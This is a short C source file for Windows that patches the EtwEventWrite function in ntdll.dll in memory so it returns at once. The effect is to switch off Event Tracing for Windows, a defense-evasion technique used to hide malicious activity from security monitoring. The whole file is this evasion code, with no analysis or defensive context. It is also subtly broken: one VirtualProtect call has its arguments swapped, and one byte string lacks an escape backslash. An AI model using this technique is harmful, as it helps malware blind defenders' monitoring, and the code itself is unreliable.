#include <stdio.h>
#include <Windows.h>

void patching() {
    DWORD dwOld = 0;
    void* pEventWrite = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");
    VirtualProtect(pEventWrite, PAGE_EXECUTE_READWRITE, 5, &dwOld);
    if (sizeof(ULONG_PTR) == 4)
        memcpy(pEventWrite, "x33\xc0\xc2\x14\x00", 5);
    else
        memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4);
    VirtualProtect(pEventWrite, 5, dwOld, &dwOld);
    FlushInstructionCache(GetCurrentProcess(), pEventWrite, 5);
}
